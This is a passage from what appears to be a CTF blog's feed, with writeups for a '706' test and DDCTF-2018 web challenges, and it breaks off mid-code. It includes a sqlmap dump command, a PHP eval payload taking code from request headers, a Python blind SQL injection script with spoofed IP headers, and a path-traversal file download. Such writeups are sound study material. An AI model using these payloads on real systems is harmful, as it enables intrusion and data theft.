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</div><div id="enc_passwd"> <input id="enc_pwd_input" type="password" style="border-radius: 5px;border-style: groove;height: 30px;width: 50%;cursor: auto;font-size: 102%;color: currentColor;outline: none;text-overflow: initial;padding-left: 5px;" onkeydown="if (event.keyCode == 13) { decrypt(); return false;}"> <input type="submit" value="解&nbsp;密" onclick="decrypt()" style="width: 58px;height: 34px;border-radius: 5px;background-color: white;border-style: solid;color: currentColor;"><div id="enc_error" style="display: inline-block;color: #d84527;margin-left: 10px"></div><script>var onError = function(error) {showMessage("嘻嘻嘻，密码不对哦~", 5000);};function decrypt() {var passwd = document.getElementById("enc_pwd_input").value;console.log(passwd);doDecrypt(passwd, onError);}</script></div>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;其实对于RSA加密算法攻击的文章，互联网上已经有很多了，所以本文主要还是以整理为主，只列出每种攻击方式的攻击条件、需要的一些工具、具体操作步骤等。&lt;/p&gt;
    
    </summary>
    
    
      <category term="ctf" scheme="https://winter3un.github.io/tags/ctf/"/>
    
      <category term="crypto" scheme="https://winter3un.github.io/tags/crypto/"/>
    
  </entry>
  
  <entry>
    <title>2018 706 writeup</title>
    <link href="https://winter3un.github.io/2018/07/09/2018-706-wp/"/>
    <id>https://winter3un.github.io/2018/07/09/2018-706-wp/</id>
    <published>2018-07-09T11:00:43.000Z</published>
    <updated>2018-07-10T00:52:55.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>706测试的题目，wp简单写下。</p><a id="more"></a><h2 id="Misc1"><a href="#Misc1" class="headerlink" title="Misc1"></a>Misc1</h2><p>两张图叠加，010处理下就出来了。</p><h2 id="Misc2"><a href="#Misc2" class="headerlink" title="Misc2"></a>Misc2</h2><p>png的长度设置长一点就出flag</p><h2 id="misc3"><a href="#misc3" class="headerlink" title="misc3"></a>misc3</h2><p>steg 打开，RGB三个最低色道分别来一次，flag组合下就出来了。</p><h2 id="Misc4"><a href="#Misc4" class="headerlink" title="Misc4"></a>Misc4</h2><p>流量包内有jsfuck编码的密码，log文件内有rar文件，拿密码去解压rar文件，就出flag</p><h2 id="re1"><a href="#re1" class="headerlink" title="re1"></a>re1</h2><p>flag直接写在main函数里了。。</p><h2 id="re2"><a href="#re2" class="headerlink" title="re2"></a>re2</h2><p>题目算法似乎有问题，反正我是没解出来，好像有人解出来了- -，真流弊</p><h2 id="crypt1"><a href="#crypt1" class="headerlink" title="crypt1"></a>crypt1</h2><p>直接写出解密脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#-*- coding:utf8 -*-</span></div><div class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES,DES3</div><div class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> md5</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">encrypt</span><span class="params">()</span>:</span></div><div class="line">flag=open(<span class="string">"flag.txt"</span>,<span class="string">"rb"</span>).read().strip()</div><div class="line">paclen=<span class="number">8</span>-len(flag)%<span class="number">8</span></div><div class="line">flag+=paclen*(chr(paclen))</div><div class="line"></div><div class="line">key1=<span class="string">"do_you_know_des3"</span></div><div class="line">obj1=DES3.new(key1,DES3.MODE_ECB)</div><div class="line">s1=obj1.encrypt(flag)</div><div class="line"></div><div class="line">key2=<span class="string">"and_you_know_aes"</span></div><div class="line">iv=md5(key2).digest()</div><div class="line">obj2=AES.new(key2,AES.MODE_CBC,iv)</div><div class="line">s2=obj2.encrypt(s1)</div><div class="line"><span class="keyword">with</span> open(<span class="string">"flag.enc"</span>,<span class="string">"wb"</span>) <span class="keyword">as</span> f:</div><div class="line">f.write(s2)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">decrypt</span><span class="params">()</span>:</span></div><div class="line">s1=open(<span class="string">"flag.enc"</span>,<span class="string">"rb"</span>).read()</div><div class="line"></div><div class="line">key2=<span class="string">"and_you_know_aes"</span></div><div class="line">iv=md5(key2).digest()</div><div class="line">obj2=AES.new(key2,AES.MODE_CBC,iv)</div><div class="line">s2=obj2.decrypt(s1)</div><div class="line"></div><div class="line"></div><div class="line">key1=<span class="string">"do_you_know_des3"</span></div><div class="line">obj1=DES3.new(key1,DES3.MODE_ECB)</div><div class="line">flag=obj1.decrypt(s2)</div><div class="line"></div><div class="line"><span class="keyword">print</span> flag</div><div class="line"></div><div class="line"></div><div class="line">decrypt()</div></pre></td></tr></table></figure><h2 id="crypt2"><a href="#crypt2" class="headerlink" title="crypt2"></a>crypt2</h2><p>Coppersmith攻击了解一下。</p><h2 id="pwn1"><a href="#pwn1" class="headerlink" title="pwn1"></a>pwn1</h2><p>静态编译，ROPgadget了解一下。</p><h2 id="pwn2"><a href="#pwn2" class="headerlink" title="pwn2"></a>pwn2</h2><p>根据0ctf2018 babyheap改的题，把off by one改没了，不知道怎么做= =</p><h2 id="web1-web7"><a href="#web1-web7" class="headerlink" title="web1-web7"></a>web1-web7</h2><p>全是原题，不会做的话，实验吧刷题了解一下。</p><h2 id="web8"><a href="#web8" class="headerlink" title="web8"></a>web8</h2><p>有waf的报错注入，waf只是为了限制考点，很容易绕过</p><h2 id="web9"><a href="#web9" class="headerlink" title="web9"></a>web9</h2><p>格式化字符串，sqlmap了解一下</p><p><code>sqlmap -r post -p username --prefix &quot;%1$&#39;&quot; --suffix &quot;#&quot; -v3 --technique=T -D ctf -T flag --dump</code></p><h2 id="web10"><a href="#web10" class="headerlink" title="web10"></a>web10</h2><p>命令执行，rctf原题改，getallheaders被禁用了，但是apache_request_headers可以</p><p>payload为<code>eval(next(apache_request_headers()));</code></p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;706测试的题目，wp简单写下。&lt;/p&gt;
    
    </summary>
    
    
      <category term="writeup" scheme="https://winter3un.github.io/tags/writeup/"/>
    
      <category term="ctf" scheme="https://winter3un.github.io/tags/ctf/"/>
    
  </entry>
  
  <entry>
    <title>DDCTF-2018  WEB WRITEUP</title>
    <link href="https://winter3un.github.io/2018/04/19/ddctf-2018/"/>
    <id>https://winter3un.github.io/2018/04/19/ddctf-2018/</id>
    <published>2018-04-20T05:44:11.000Z</published>
    <updated>2018-04-20T05:48:49.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>工作需要较强的web安全能力，所以我想通过打ctf的web类题目来提高这方面的水平，以下为这次didictf web类的题解。</p><a id="more"></a><h2 id="web1"><a href="#web1" class="headerlink" title="web1"></a>web1</h2><img src="/2018/04/19/ddctf-2018/1.png" alt="1.png" title=""><p>非法链接的问题，直接在http头中加入以下键值对绕过<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">X-Originating-IP: 123.232.23.245</div><div class="line">X-Forwarded-For: 123.232.23.245</div><div class="line">X-Remote-IP: 123.232.23.245</div><div class="line">X-Remote-Addr: 123.232.23.245</div></pre></td></tr></table></figure></p><p>其实也可以配置burp的插件bypass waf（<a href="https://www.codewatch.org/blog/?p=408" target="_blank" rel="external">https://www.codewatch.org/blog/?p=408</a> ） ，来绕过限制正常在客户端浏览。</p><img src="/2018/04/19/ddctf-2018/2.png" alt="2.png" title=""><p>emmm…明显考察注入，不过这边的注入点比较隐蔽，在<code>author</code>参数这儿，页面上隐藏了输入点，我们可以直接写python脚本通过盲注的手法跑出flag</p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> requests</div><div class="line"><span class="keyword">import</span> time</div><div class="line"><span class="keyword">import</span> hashlib</div><div class="line"></div><div class="line">s = <span class="string">''</span></div><div class="line"><span class="keyword">for</span> index <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">0x20</span>):</div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0x30</span>,<span class="number">0x7f</span>):</div><div class="line">id = <span class="string">""</span></div><div class="line">title = <span class="string">""</span></div><div class="line">date = <span class="string">""</span></div><div class="line">author = <span class="string">"-1'||if(ord(substr((select secvalue from ctf_key9 limit 0,1),"</span>+str(index)+<span class="string">",1))="</span>+str(i)+<span class="string">",0,1)#"</span></div><div class="line"></div><div class="line"><span class="comment"># select * from content where id = ? and author = ' -1' ||  ' and date = ' = 'a' union '   </span></div><div class="line"></div><div class="line">proxies = &#123;<span class="string">"http"</span>:<span class="string">"127.0.0.1:8080"</span>&#125;</div><div class="line"></div><div class="line">data = &#123; <span class="string">"id"</span>:id,</div><div class="line"><span class="string">"title"</span>:title,</div><div class="line"><span class="string">"author"</span>:author,</div><div class="line"><span class="string">"data"</span>:date,</div><div class="line"><span class="string">"button"</span>:<span class="string">"search"</span></div><div class="line">&#125;</div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line">t = str(int(time.time()))</div><div class="line"></div><div class="line">str0 = <span class="string">'id='</span>+id+<span class="string">'title='</span>+title+<span class="string">'author='</span>+author+<span class="string">'date='</span>+date+<span class="string">'time='</span>+t+<span class="string">'adrefkfweodfsdpiru'</span></div><div class="line"></div><div class="line"></div><div class="line">sig = hashlib.sha1(str0).hexdigest()</div><div class="line"></div><div class="line"></div><div class="line">ip = <span class="string">'123.232.23.245'</span></div><div class="line"></div><div class="line">headers  = &#123;<span class="string">'X-Originating-IP'</span>: ip,</div><div class="line"><span class="string">'X-Forwarded-For'</span>: ip,</div><div class="line"><span class="string">'X-Remote-IP'</span>: ip,</div><div class="line"><span class="string">'X-Remote-Addr'</span>: ip,</div><div class="line"><span class="string">'X-Client-IP'</span>: ip,</div><div class="line"><span class="string">"User-Agent"</span>: <span class="string">"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36"</span>,</div><div class="line"><span class="string">'Referer'</span>:<span class="string">"http://123.232.23.245/"</span></div><div class="line">&#125;</div><div class="line"></div><div class="line"></div><div class="line"><span class="keyword">if</span> len(requests.post(url=<span class="string">"http://116.85.43.88:8080/NQYPTEMNWRQIYLEP/dfe3ia/index.php?sig="</span>+sig+<span class="string">"&amp;time="</span>+str(int(time.time())),data=data,headers=headers,proxies=proxies).content) != <span class="number">2420</span>:</div><div class="line">s += chr(i)</div><div class="line"><span class="keyword">break</span></div><div class="line"><span class="keyword">print</span> s</div><div class="line"><span class="comment"># print str0</span></div></pre></td></tr></table></figure><h2 id="web2"><a href="#web2" class="headerlink" title="web2"></a>web2</h2><p>web2的难度明显要比web1要高。</p><p>点击链接进去后，直接<code>ctrl+u</code>看源码，发现了可疑的链接<br><img src="/2018/04/19/ddctf-2018/3.png" alt="3.png" title=""></p><p>将<code>ZmF2aWNvbi5pY28=</code> base64解码后，发现是<code>favicon.ico</code> ，初步判断该<code>api</code>应该存在任意文件下载漏洞。</p><p>接下来通过构造<code>web.xml</code>的地址(<code>../../WEB-INF/web.xml</code> —base64&gt;&gt;&gt; <code>Li4vLi4vV0VCLUlORi93ZWIueG1s</code>)，并利用该漏洞，下载该配置文件。</p><p>下载完了以后分析该<code>web.xml</code>文件，在文件内发现其他关联的文件，仿照上一步操作，将所有相关的文件都下载到本地分析。</p><p>在<code>web.xml</code>中发现该<code>class</code>文件</p><img src="/2018/04/19/ddctf-2018/4.png" alt="4.png" title=""><p>下载至本地后，用<code>GD-GUI</code>分析发现为<code>flag</code>的加密算法</p><img src="/2018/04/19/ddctf-2018/5.png" alt="5.png" title=""><p>但是我们缺少关键的<code>email</code>和<code>flag</code>密文，继续寻找相关文件，开了下脑洞，猜测控制器文件<code>FlagController.class</code>,没想到真的有233333 下载下来分析。如图，只要我们给<code>email</code>就给我们加密后的<code>flag</code> 233333 </p><img src="/2018/04/19/ddctf-2018/6.png" alt="6.png" title=""><p>回到首页，发现<code>email</code>。。。</p><img src="/2018/04/19/ddctf-2018/7.png" alt="7.png" title=""><p>所有条件都齐全了，逆向算法，最后写出了对应的解密脚本</p><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> java.io.File;</div><div class="line"><span class="keyword">import</span> java.io.FileInputStream;</div><div class="line"><span class="keyword">import</span> java.io.IOException;</div><div class="line"><span class="keyword">import</span> java.io.InputStream;</div><div class="line"><span class="keyword">import</span> java.io.PrintStream;</div><div class="line"><span class="keyword">import</span> java.security.InvalidKeyException;</div><div class="line"><span class="keyword">import</span> java.security.Key;</div><div class="line"><span class="keyword">import</span> java.security.KeyStore;</div><div class="line"><span class="keyword">import</span> java.security.PublicKey;  </div><div class="line"><span class="keyword">import</span> java.security.KeyStoreException;</div><div class="line"><span class="keyword">import</span> java.security.NoSuchAlgorithmException;</div><div class="line"><span class="keyword">import</span> java.security.SecureRandom;</div><div class="line"><span class="keyword">import</span> java.security.UnrecoverableKeyException;</div><div class="line"><span class="keyword">import</span> java.security.cert.CertificateException;</div><div class="line"><span class="keyword">import</span> java.util.Properties;</div><div class="line"><span class="keyword">import</span> java.util.UUID;</div><div class="line"><span class="keyword">import</span> javax.crypto.BadPaddingException;</div><div class="line"><span class="keyword">import</span> javax.crypto.Cipher;</div><div class="line"><span class="keyword">import</span> javax.crypto.IllegalBlockSizeException;</div><div class="line"><span class="keyword">import</span> javax.crypto.Mac;</div><div class="line"><span class="keyword">import</span> javax.crypto.NoSuchPaddingException;</div><div class="line"><span class="keyword">import</span> javax.crypto.spec.SecretKeySpec;</div><div class="line"><span class="keyword">import</span> sun.misc.BASE64Decoder;  </div><div class="line"><span class="keyword">import</span> sun.misc.BASE64Encoder;  </div><div class="line"></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">decrypt</span></span></div><div class="line">&#123;</div><div class="line"> <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">byte</span>[] decryptBASE64(String key) <span class="keyword">throws</span> Exception &#123;  </div><div class="line">        <span class="keyword">return</span> (<span class="keyword">new</span> BASE64Decoder()).decodeBuffer(key);  </div><div class="line">    &#125;  </div><div class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span></div><div class="line">&#123;</div><div class="line"><span class="keyword">try</span>&#123;</div><div class="line">KeyStore keyStore = KeyStore.getInstance(KeyStore.getDefaultType());</div><div class="line">FileInputStream inputStream = <span class="keyword">new</span> FileInputStream(<span class="string">"C:\\Users\\Administrator\\Desktop\\ddctf\\web2\\key\\sdl.ks"</span>);</div><div class="line">keyStore.load(inputStream, <span class="string">"sdl welcome you !"</span>.substring(<span class="number">0</span>, <span class="string">"sdl welcome you !"</span>.length() - <span class="number">1</span>).trim().replace(<span class="string">" "</span>, <span class="string">""</span>).toCharArray());</div><div class="line"></div><div class="line">PublicKey key = keyStore.getCertificate(<span class="string">"www.didichuxing.com"</span>).getPublicKey();  </div><div class="line">System.out.println(key);</div><div class="line">Cipher cipher = Cipher.getInstance(key.getAlgorithm());</div><div class="line">cipher.init(<span class="number">2</span>, key); </div><div class="line"></div><div class="line"><span class="keyword">byte</span>[] text = decryptBASE64(<span class="string">"S1EgULNQ7TlSYnuzagfIe5gfmjYWZRJE7YBSKoaOGmYZ6yjkmbapuNDyQDiUyjV2mKDGm2hnhkgwA6l0qsdvD9uSOjStWMHHYerOZGvk8epWSQ8YYn2pWArUlV7m2e4nV6oqKYYXRMJVO8776JX00OY/MmUeaj6XoAHk4cWar3BpwAfLw3hsUYDM1NoVjBkPy/SS/DHDhf9YsM+3kF3hNmyUc7tqTvvb/1gzovigpmoAIzc8FDxeaBprG+084bkoIiMlBs8cUyUyZq4x7PD6jvVkb00kHUeVERPFIVxlbS1ph4jS+Wy6yd3GNaYe0wUUwoxd/5MiSG4Z4l4miFX8SQ=="</span>);</div><div class="line"></div><div class="line"></div><div class="line"><span class="keyword">byte</span>[] doFinal = cipher.doFinal(text); </div><div class="line"></div><div class="line"></div><div class="line">System.out.println(byte2hex(doFinal));</div><div class="line">&#125;</div><div class="line"><span class="keyword">catch</span>(Exception e)</div><div class="line">&#123;</div><div class="line">System.out.println(<span class="string">"e:"</span>+e);</div><div class="line">&#125;</div><div class="line">&#125;</div><div class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">byte2hex</span><span 